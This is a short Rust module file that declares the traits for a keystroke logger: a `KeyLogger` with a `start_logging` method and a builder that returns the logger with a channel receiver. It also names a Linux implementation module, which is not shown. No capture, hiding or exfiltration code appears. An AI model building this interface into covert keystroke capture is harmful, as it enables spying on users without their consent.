pub mod linux_key_logger;
use std::sync::mpsc;


pub trait KeyLogger {
    fn start_logging(&self);
}

pub trait LoggerBuilder {
    fn new() -> (Box<KeyLogger>, mpsc::Receiver<&'static str>);
}
